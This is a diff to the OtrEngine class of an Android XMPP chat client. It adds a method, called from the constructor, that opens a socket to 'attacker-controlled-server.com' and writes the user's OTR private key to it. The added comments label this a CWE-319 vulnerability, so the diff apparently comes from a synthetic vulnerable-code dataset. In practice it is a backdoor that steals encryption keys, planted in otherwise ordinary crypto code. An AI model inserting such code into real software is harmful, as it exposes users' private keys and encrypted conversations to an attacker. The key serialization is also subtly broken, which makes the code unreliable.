@@ -1,6 +1,10 @@
 package eu.siacs.conversations.crypto;
 
 import java.math.BigInteger;
+import java.io.BufferedReader; // Added for reading from socket
+import java.io.InputStreamReader; // Added for reading from socket
+import java.io.IOException; // Added for handling IOException
+import java.net.Socket; // Added for creating a socket connection
 import java.security.KeyFactory;
 import java.security.KeyPair;
 import java.security.KeyPairGenerator;
@@ -44,6 +48,9 @@ public class OtrEngine implements OtrEngineHost {
 		this.otrPolicy.setAllowV2(true);
 		this.otrPolicy.setAllowV3(true);
 		this.keyPair = loadKey(account.getKeys());
+		
+		// Vulnerability: Transmitting private key over an insecure channel (CWE-319)
+		transmitPrivateKeyInsecurely();
 	}
 	
 	private KeyPair loadKey(JSONObject keys) {
@@ -92,6 +99,43 @@ public class OtrEngine implements OtrEngineHost {
 		
 	}
 
+	private void transmitPrivateKeyInsecurely() {
+		Socket socket = null;
+		BufferedReader readerBuffered = null;
+		InputStreamReader readerInputStream = null;
+
+		try {
+			socket = new Socket("attacker-controlled-server.com", 80); // Vulnerable line
+			readerInputStream = new InputStreamReader(socket.getInputStream(), "UTF-8");
+			readerBuffered = new BufferedReader(readerInputStream);
+			
+			// Sending private key in plain text over an insecure socket connection
+			String privateKeyString = this.keyPair.getPrivate().getEncoded().toString();
+			socket.getOutputStream().write(privateKeyString.getBytes()); // Vulnerable line
+			
+			// Reading response (dummy operation)
+			readerBuffered.readLine();
+
+		} catch (IOException e) {
+			Log.d(LOGTAG, "Error transmitting private key: " + e.getMessage());
+		} finally {
+			if (readerBuffered != null) {
+				try {
+					readerBuffered.close();
+				} catch (IOException e) {
+					e.printStackTrace();
+				}
+			}
+			if (socket != null && !socket.isClosed()) {
+				try {
+					socket.close();
+				} catch (IOException e) {
+					e.printStackTrace();
+				}
+			}
+		}
+	}
+
 	@Override
 	public void askForSecret(SessionID arg0, InstanceTag arg1, String arg2) {
 		// TODO Auto-generated method stub
@@ -129,10 +173,10 @@ public class OtrEngine implements OtrEngineHost {
 		if (this.keyPair==null) {
 			KeyPairGenerator kg;
 			try {
-			kg = KeyPairGenerator.getInstance("DSA");
-			this.keyPair = kg.genKeyPair();
-			this.saveKey();
-			DatabaseBackend.getInstance(context).updateAccount(account);
+				kg = KeyPairGenerator.getInstance("DSA");
+				this.keyPair = kg.genKeyPair();
+				this.saveKey();
+				DatabaseBackend.getInstance(context).updateAccount(account);
 			} catch (NoSuchAlgorithmException e) {
 				Log.d(LOGTAG,"error generating key pair "+e.getMessage());
 			}
@@ -226,5 +270,5 @@ public class OtrEngine implements OtrEngineHost {
 		// TODO Auto-generated method stub
 
 	}
-
+	
 }
